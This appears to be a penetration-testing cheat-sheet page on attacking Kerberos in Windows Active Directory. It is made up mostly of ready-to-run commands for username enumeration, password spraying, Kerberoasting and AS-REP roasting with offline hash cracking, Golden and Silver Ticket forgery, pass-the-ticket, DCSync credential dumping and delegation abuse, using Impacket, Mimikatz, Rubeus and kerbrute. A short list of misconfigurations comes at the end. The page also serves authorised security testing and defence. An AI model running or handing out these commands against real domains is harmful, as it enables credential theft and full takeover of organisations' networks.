# Kerberos

**`Default Port: 88`**

**Kerberos** is a network authentication protocol designed to provide strong authentication for client/server applications using secret-key cryptography. Developed by MIT, it's the default authentication protocol in Windows Active Directory environments. Kerberos uses tickets to allow nodes to prove their identity over non-secure networks without transmitting passwords. The protocol involves a Key Distribution Center (KDC) that includes an Authentication Server (AS) and a Ticket Granting Server (TGS).

### Connect <a href="#connect" id="connect"></a>

#### Using kinit (Get TGT) <a href="#using-kinit-get-tgt" id="using-kinit-get-tgt"></a>

Use the standard Kerberos client to obtain Ticket Granting Tickets.

```
# Request Ticket Granting Ticket
kinit username@DOMAIN.COM

# With password
echo 'password' | kinit username@DOMAIN.COM

# Check tickets
klist

# Destroy tickets
kdestroy
```

#### Using Impacket Tools <a href="#using-impacket-tools" id="using-impacket-tools"></a>

Use Impacket tools for advanced Kerberos operations and ticket management.

```
# Get TGT
getTGT.py DOMAIN/username:password

# Use ticket
export KRB5CCNAME=username.ccache

# Request service ticket
getST.py -spn service/hostname DOMAIN/username -k -no-pass
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use `Nmap` to identify Domain Controllers and Kerberos services in Active Directory environments:

```
nmap -p 88 -sV target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Use `netcat` to identify Kerberos servers and gather realm information:

```
# Using netcat (limited)
nc -vn target.com 88
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Username Enumeration <a href="#username-enumeration" id="username-enumeration"></a>

Kerberos provides different error messages for valid and invalid usernames, enabling user enumeration without authentication.

**Using kerbrute**

```
# Using kerbrute
kerbrute userenum --dc target.com -d DOMAIN.COM users.txt
```

**Using Nmap Scripts**

```
# Using Nmap
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.COM',userdb=users.txt target.com
```

**Manual Username Enumeration**

```
# Manual enumeration
for user in $(cat users.txt); do
  getTGT.py DOMAIN/$user -dc-ip target.com -no-pass 2>&1 | grep -v "KDC_ERR_PREAUTH_REQUIRED"
done
```

#### SPN Enumeration (Service Discovery) <a href="#spn-enumeration-service-discovery" id="spn-enumeration-service-discovery"></a>

Service Principal Names (SPNs) identify services running under specific accounts and are prime targets for Kerberoasting attacks.

```
# Using GetUserSPNs (Impacket)
GetUserSPNs.py DOMAIN/username:password -dc-ip target.com

# Without credentials (requires access to DC)
GetUserSPNs.py -request -dc-ip target.com DOMAIN/username

# From Windows
setspn -T DOMAIN.COM -Q */*
```

#### AS-REP Roastable Users <a href="#as-rep-roastable-users" id="as-rep-roastable-users"></a>

Users with "Do not require Kerberos preauthentication" enabled can have their password hashes extracted without valid credentials.

```
# Using GetNPUsers (Impacket)
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip target.com -format hashcat

# Specific user
GetNPUsers.py DOMAIN/username -dc-ip target.com -no-pass

# From Windows with PowerView
Get-DomainUser -PreauthNotRequired
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Kerberoasting <a href="#kerberoasting" id="kerberoasting"></a>

Kerberoasting exploits service accounts with SPNs by requesting tickets that can be cracked offline.

**Request Service Tickets**

```
GetUserSPNs.py DOMAIN/username:password -dc-ip target.com -request -outputfile hashes.txt
```

**Crack Kerberos Tickets**

```
# Using Hashcat (Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 hashes.txt rockyou.txt

# Using John the Ripper
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt

# From Windows with Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
```

#### AS-REP Roasting <a href="#as-rep-roasting" id="as-rep-roasting"></a>

Exploit accounts that don't require Kerberos pre-authentication.

```
# Get AS-REP hashes
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -dc-ip target.com > asrep_hashes.txt

# Crack with hashcat (Kerberos 5 AS-REP etype 23)
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# From Windows with Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

#### Password Spraying <a href="#password-spraying" id="password-spraying"></a>

Attempt common passwords across many accounts to avoid account lockouts.

```
# Using kerbrute
kerbrute passwordspray --dc target.com -d DOMAIN.COM users.txt 'Password123!'

# Using crackmapexec
crackmapexec smb target.com -u users.txt -p 'Password123!' --continue-on-success

# Multiple passwords
for pass in 'Winter2024!' 'Spring2024!' 'Password123!'; do
  kerbrute passwordspray --dc target.com -d DOMAIN.COM users.txt "$pass"
done
```

#### Golden Ticket Attack <a href="#golden-ticket-attack" id="golden-ticket-attack"></a>

Create forged TGT with stolen krbtgt hash to gain domain admin access.

**Golden Ticket Creation**

```
# Using Mimikatz (requires krbtgt hash)
kerberos::golden /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:KRBTGT_HASH /id:500

# Using Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX-XXX-XXX -domain DOMAIN.COM Administrator
```

**Using Golden Tickets**

```
# Set ticket
export KRB5CCNAME=Administrator.ccache

# Access any resource
psexec.py DOMAIN/Administrator@target.com -k -no-pass
```

#### Silver Ticket Attack <a href="#silver-ticket-attack" id="silver-ticket-attack"></a>

Create forged service ticket with service account hash for specific service access.

**Silver Ticket Creation**

```
# Using Mimikatz
kerberos::golden /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-XXX-XXX-XXX /target:server.domain.com /service:cifs /rc4:SERVICE_HASH /id:500

# Using Impacket
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-XXX-XXX-XXX -domain DOMAIN.COM -spn cifs/server.domain.com Administrator
```

**Using Silver Tickets**

```
# Access the specific service
smbclient.py -k DOMAIN/Administrator@server.domain.com
```

#### Pass-the-Ticket <a href="#pass-the-ticket" id="pass-the-ticket"></a>

Use stolen Kerberos tickets to authenticate without knowing passwords.

**Ticket Extraction and Conversion**

```
# Export ticket from Windows
mimikatz "sekurlsa::tickets /export"

# Convert .kirbi to .ccache
ticketConverter.py ticket.kirbi ticket.ccache
```

**Using Stolen Tickets**

```
# Use ticket
export KRB5CCNAME=ticket.ccache
psexec.py DOMAIN/username@target.com -k -no-pass
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Ticket Extraction <a href="#ticket-extraction" id="ticket-extraction"></a>

Extract Kerberos tickets from compromised systems for lateral movement.

**Windows Ticket Extraction**

```
# Using Mimikatz on compromised Windows
sekurlsa::tickets /export

# Using Rubeus
Rubeus.exe dump /service:krbtgt
```

**Linux Ticket Extraction**

```
# From Linux with tickey
impacket-getTGT DOMAIN/username:password
```

#### DCSync Attack <a href="#dcsync-attack" id="dcsync-attack"></a>

Extract password hashes from Domain Controller using DCSync technique.

```
# Using Mimikatz
lsadump::dcsync /user:DOMAIN\krbtgt
lsadump::dcsync /user:DOMAIN\Administrator

# Using Impacket
secretsdump.py DOMAIN/username:password@dc.domain.com

# Just DCSync (no SAM/LSA)
secretsdump.py -just-dc DOMAIN/username:password@dc.domain.com
```

#### Delegation Abuse <a href="#delegation-abuse" id="delegation-abuse"></a>

Exploit Kerberos delegation configurations for privilege escalation.

**Delegation Discovery**

```
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# Find users with constrained delegation
Get-DomainUser -TrustedToAuth
```

**Delegation Exploitation**

```
# Exploit unconstrained delegation
# Compromise server with unconstrained delegation
# Wait for admin to connect
# Extract their TGT from memory
```

### Kerberos Ticket Types <a href="#kerberos-ticket-types" id="kerberos-ticket-types"></a>

| Ticket        | Description             | Use Case                |
| ------------- | ----------------------- | ----------------------- |
| TGT           | Ticket Granting Ticket  | Initial authentication  |
| TGS           | Ticket Granting Service | Service access          |
| Golden Ticket | Forged TGT              | Full domain access      |
| Silver Ticket | Forged TGS              | Specific service access |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool            | Description          | Primary Use Case           |
| --------------- | -------------------- | -------------------------- |
| kerbrute        | Kerberos enumeration | Username/password spraying |
| Rubeus          | Kerberos attack tool | Windows-based attacks      |
| Mimikatz        | Credential dumper    | Ticket manipulation        |
| Impacket        | Python toolkit       | Various Kerberos attacks   |
| hashcat         | Password cracker     | Ticket cracking            |
| John the Ripper | Password cracker     | Hash cracking              |
| PowerView       | AD enumeration       | Domain reconnaissance      |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ Pre-authentication not required
* ❌ Weak service account passwords
* ❌ RC4 encryption allowed
* ❌ Unconstrained delegation
* ❌ Excessive SPNs on accounts
* ❌ Long ticket lifetimes
* ❌ No monitoring of Kerberos events
* ❌ Weak krbtgt password
* ❌ Legacy encryption types enabled
* ❌ No PAC validation

<br>
